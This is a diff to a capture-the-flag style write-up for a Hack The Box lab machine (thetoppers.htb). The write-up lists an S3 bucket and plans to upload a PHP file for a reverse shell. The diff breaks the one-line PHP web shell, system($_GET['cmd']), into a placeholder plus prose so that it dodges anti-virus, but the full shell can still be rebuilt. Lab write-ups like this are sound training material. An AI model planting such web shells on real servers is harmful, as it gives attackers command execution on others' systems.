@@ -115,11 +115,13 @@ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 2024-07-05 08:43:14      11952 index.php
 ```
 
-We can read from the bucket, can we write to it and create a reverse shell? First the PHP file we will attempt to upload,
+We can read from the bucket, can we write to it and create a reverse shell? First the PHP file we will attempt to upload. I've broken this PHP code up because it triggers my anti-virus.
 
 ```php
-<?php system($_GET["cmd"]); ?>
+<?php //Insert system call here ?>
 ```
+
+The system call to insert is, `system($_GET["***"]);` replacing *** with `cmd`.
 
 And attempt to upload it,
 
